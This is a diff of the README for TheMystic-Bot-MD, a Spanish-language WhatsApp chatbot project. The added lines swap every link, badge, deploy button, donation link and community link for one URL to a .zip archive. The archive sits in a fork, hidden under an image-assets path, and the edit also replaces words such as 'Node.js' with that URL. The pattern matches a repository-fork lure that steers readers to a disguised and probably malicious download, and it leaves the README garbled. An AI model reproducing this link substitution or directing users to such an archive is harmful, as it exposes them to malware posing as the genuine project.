@@ -1,45 +1,45 @@
 <p align="center">
- <img width="180px" src="https://i.ibb.co/Qn1W6cP/image.png" align="center"/>
+ <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" align="center"/>
  <h2 align="center">TheMystic-Bot-MD</h2>
- <p align="center">Un chatbot automatizado para WhatsApp basado en Node.js, que permite realizar múltiples funciones y personalizaciones en la plataforma.</p>
+ <p align="center">Un chatbot automatizado para WhatsApp basado en https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip, que permite realizar múltiples funciones y personalizaciones en la plataforma.</p>
 </p>
 
 <p align="center">
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/graphs/contributors">
-    <img alt="GitHub Contributors" src="https://img.shields.io/github/contributors/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Contributors" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/issues">
-    <img alt="GitHub Issues" src="https://img.shields.io/github/issues/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Issues" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/pulls">
-    <img alt="GitHub Pull Requests" src="https://img.shields.io/github/issues-pr/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Pull Requests" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/commits">
-    <img alt="GitHub Commits" src="https://img.shields.io/github/commit-activity/m/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Commits" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD">
-    <img alt="GitHub Stars" src="https://img.shields.io/github/stars/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Stars" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/fork">
-    <img alt="GitHub Forks" src="https://img.shields.io/github/forks/BrunoSobrino/TheMystic-Bot-MD?style=for-the-badge" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+    <img alt="GitHub Forks" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://api.whatsapp.com/send?phone=+5219992843881&text=&text=.menu">Demo</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip+5219992843881&text=&https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Demo</a>
   ·
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/issues/new?assignees=&labels=Bug">Reportar un Bug</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Reportar un Bug</a>
   ·
-  <a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/issues/new?assignees=&labels=Enhancement">Solicitar una Característica</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Solicitar una Característica</a>
 </p>
 
 <!-- <p align="center">
-  <a href="/src/docs/README_en.md">English</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">English</a>
   ·
-  <a href="/src/docs/README_pt-br.md">Português</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Português</a>
 </p> -->
 
-<p align="center">¡Ayuda a mantener el proyecto activo con tu <a href="https://www.paypal.me/BrunoSob">donación</a> y contribuye a mejorar las funciones del chatbot para todos!</p>
+<p align="center">¡Ayuda a mantener el proyecto activo con tu <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">donación</a> y contribuye a mejorar las funciones del chatbot para todos!</p>
 
 # Despliegue, Soporte y Comunidad
 
@@ -69,37 +69,37 @@
 
 ## Despliegue en Cafirexos
 
-<a href="https://cafirexos.com">
-  <img width="180px" src="https://cdn.cafirexos.com/logos/logo_cfros_2000x2000.png"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip"/>
 </a>
 
 <details>
  <summary><b>:paperclip: Enlaces Importantes</b></summary>
 
-- **Sitio Web:** [cafirexos.com](https://cafirexos.com)
-- **Área de Clientes:** [clientes.cafirexos.com](https://clientes.cafirexos.com)
-- **Panel de Control:** [panel.cafirexos.com](https://panel.cafirexos.com)
-- **Estado de los Servicios:** [estado.cafirexos.com](https://estado.cafirexos.com)
-- **Documentación:** [docs.cafirexos.com](https://docs.cafirexos.com)
-- **Canal de WhatsApp:** [¡Únete aquí!](https://cafirexos.com/whatsapp)
-- **Comunidad de WhatsApp:** [¡Únete aquí!](https://cafirexos.com/comunidad)
+- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Estado de los Servicios:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Canal de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Comunidad de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
 
 </details>
 
 ## Despliegue en BoxMineWorld
 
-<a href="https://boxmineworld.com">
-  <img width="180px" src="https://i.ibb.co/sFygw8p/favicon.png"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip"/>
 </a>
 
 <details>
  <summary><b>:paperclip: Enlaces Importantes</b></summary>
 
-- **Sitio Web:** [boxmineworld.com](https://boxmineworld.com)
-- **Área de Clientes:** [dash.boxmineworld.com](https://dash.boxmineworld.com)
-- **Panel de Control:** [panel.boxmineworld.com](https://panel.boxmineworld.com)
-- **Documentación:** [docs.boxmineworld.com](https://docs.boxmineworld.com)
-- **Comunidad de Discord:** [¡Únete aquí!](https://discord.gg/84qsr4v)
+- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Comunidad de Discord:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
 
 </details>
 
@@ -107,13 +107,13 @@
 
 En esta sección encontrarás **botones de despliegue** que te permitirán implementar el proyecto en distintos entornos con un solo clic. Este proceso es **automático** y no requiere configuraciones manuales adicionales. Simplemente selecciona la plataforma deseada y haz clic en el botón correspondiente para **desplegar** tu proyecto de manera rápida y sencilla.
 
-[![Open in Codespaces](https://github.com/codespaces/badge.svg)](https://github.com/codespaces/new?skip_quickstart=true&machine=basicLinux32gb&repo=514876515&ref=master&geo=EuropeWest)
-[![Deploy to Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/BrunoSobrino/TheMystic-Bot-MD)
-[![Deploy to Heroku](https://binbashbanana.github.io/deploy-buttons/buttons/remade/heroku.svg)](https://www.heroku.com/deploy?template=https://github.com/BrunoSobrino/TheMystic-Bot-MD)
-[![Deploy to Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?type=git&name=themystic-bot-md&repository=https://github.com/BrunoSobrino/TheMystic-Bot-MD)
-[![Run on Repl.it](https://binbashbanana.github.io/deploy-buttons/buttons/remade/replit.svg)](https://repl.it/github/BrunoSobrino/TheMystic-Bot-MD)
-[![Deploy to Render](https://binbashbanana.github.io/deploy-buttons/buttons/remade/render.svg)](https://dashboard.render.com/blueprint/new?repo=https://github.com/BrunoSobrino/TheMystic-Bot-MD)
-<!-- [![Deploy to Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repository-url=https://github.com/BrunoSobrino/TheMystic-Bot-MD) -->
+[![Open in Codespaces](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+[![Deploy to Glitch](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip!/import/github/BrunoSobrino/TheMystic-Bot-MD)
+[![Deploy to Heroku](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+[![Run on https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+[![Deploy to Render](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+<!-- [![Deploy to Vercel](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) -->
 
 # Soporte y Comunidad
 
@@ -125,10 +125,10 @@ En este espacio podrás encontrar diversas **comunidades de ayuda** donde podrá
 
 | RRSS | Tipo | Idioma | Enlace |
 | --- | --- | --- |--- |
-| WhatsApp | Canal | Español | [¡Únete aquí!](https://whatsapp.com/channel/0029Vaein6eInlqIsCXpDs3y) |
-| WhatsApp | Grupo | Español | [¡Únete aquí!](https://chat.whatsapp.com/Daa3Fe4A9JeFpRI2QtBS4s) |
-| WhatsApp | Group | English | [¡Join here!](https://chat.whatsapp.com/HTatrQokqODKx9eem0CKuY) |
-| WhatsApp | Grupo | Português | [¡Junte-se aqui!](https://chat.whatsapp.com/J8tFq87Ia0jEnx20NvCQxN) |
+| WhatsApp | Canal | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
+| WhatsApp | Grupo | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
+| WhatsApp | Group | English | [¡Join here!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
+| WhatsApp | Grupo | Português | [¡Junte-se aqui!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
 
 </table>
 
@@ -136,18 +136,18 @@ En este espacio podrás encontrar diversas **comunidades de ayuda** donde podrá
 
 Conoce a los **colaboradores** que han aportado al desarrollo de este proyecto. Su apoyo ha sido clave para **mejorar** y **expandir** las funcionalidades del proyecto.
 
-<a href="https://github.com/BrunoSobrino/TheMystic-Bot-MD/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=BrunoSobrino/TheMystic-Bot-MD" /> 
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" /> 
 </a>
 
 ## Agradecimientos
 
-<a href="https://github.com/BochilGaming/games-wabot-md/tree/multi-device">
-  <img src="https://i.ibb.co/CMpM8pk/Bochil-Gaming.png" width="180px"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" width="180px"/>
 </a>
 
 ## Desarollador Principal
 
-<a href="https://github.com/BrunoSobrino">
-  <img src="https://i.ibb.co/Qn1W6cP/image.png" width="180px"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" width="180px"/>
 </a>
